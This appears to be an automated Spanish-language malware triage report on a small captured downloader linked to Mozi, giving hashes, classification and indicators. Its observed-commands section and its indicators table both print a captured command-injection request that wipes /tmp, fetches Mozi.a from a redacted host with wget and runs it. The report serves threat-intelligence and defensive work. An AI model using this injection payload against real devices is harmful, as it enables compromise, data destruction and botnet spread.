# 🧬 Payload Analysis

`0ff719137c19dc509cd6e0bf3a4917603e2a45b72b1369af494af74bc46fa408`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 158 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.a` en `hxxp://[internal-ip-redacted]:8088/Mozi.a`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:06:23.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `0ff719137c19dc509cd6e0bf3a4917603e2a45b72b1369af494af74bc46fa408`
- **SHA1:** `0f4d2be172abb723d05b833908dd11538937c76d`
- **MD5:** `a4fc5de1e7e06b210e145739d0b48c93`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 158 B |
| Entropía | 5.25 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=3

## 🖥️ Comandos observados / extraídos

```text
GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://[internal-ip-redacted]:8088/Mozi.a;sh${IFS}/tmp/Mozi.
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://[internal-ip-redacted]:8088/Mozi.a;sh$ | strings |
| command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://[internal-ip-redacted]:8088/Mozi.a;sh${IFS}/tmp/Mozi. | strings |
| hash | 0ff719137c19dc509cd6e0bf3a4917603e2a45b72b1369af494af74bc46fa408 | static_analysis |
| ip | 120.85.117.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
